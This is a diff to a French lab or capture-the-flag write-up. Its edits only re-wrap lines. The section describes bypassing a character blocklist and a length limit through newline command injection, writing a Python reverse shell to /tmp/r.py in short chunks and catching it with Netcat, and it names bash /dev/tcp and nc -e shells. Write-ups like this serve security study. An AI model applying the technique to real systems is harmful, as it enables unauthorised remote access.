@@ -81,12 +81,14 @@ Contournement du filtrage pour un reverse shell
 
 L'obtention d'un shell interactif s'est heurtée à plusieurs protections découvertes par bissection (testées un caractère/fragment à la fois) :
 
-- Une blocklist de caractères rejetant notamment ;, |, `, $ et & (donc les techniques classiques bash -i >& /dev/tcp/... ou nc -e sont bloquées ou inutilisables — nc -e s'est par ailleurs révélé absent du binaire netcat installé sur la cible).
+- Une blocklist de caractères rejetant notamment ;, |, `, $ et & (donc les techniques classiques bash -i >& /dev/tcp/... ou nc -e sont bloquées ou inutilisables — nc -e s'est par ailleurs révélé
+absent du binaire netcat installé sur la cible).
 - Une limite de longueur de 100 caractères sur le champ target, empêchant l'envoi direct d'un payload de reverse shell Python complet en une seule requête.
 
 Le contournement retenu consiste à écrire un script Python de reverse shell sur le disque via une série de requêtes courtes (echo '<ligne>' >> /tmp/r.py, chacune sous la limite de 100 caractères), puis à l'exécuter en une dernière requête (python3 /tmp/r.py), avec un listener Netcat en écoute côté attaquant. Cette approche permet d'obtenir un shell interactif complet en tant que www-data.
 
-La lecture ultérieure du code source de l'application (app.py, accessible en lecture depuis le shell obtenu) confirme précisément ces protections : requête SQL construite par concaténation de chaîne sans paramétrage pour le login, appel subprocess.Popen("ping ... " + target, shell=True) pour le health check, filtre re.compile(r"[;|$&]"), et contrôle explicite len(target) > 100 — sans aucune protection contre l'injection de saut de ligne (%0a`), commentée dans le code comme faille connue.
+La lecture ultérieure du code source de l'application (app.py, accessible en lecture depuis le shell obtenu) confirme précisément ces protections : requête SQL construite par concaténation de chaîne sans paramétrage pour le login, 
+appel subprocess.Popen("ping ... " + target, shell=True) pour le health check, filtre re.compile(r"[;|$&]"), et contrôle explicite len(target) > 100 — sans aucune protection contre l'injection de saut de ligne (%0a`), commentée dans le code comme faille connue.
 
 ## Élévation de privilèges
 
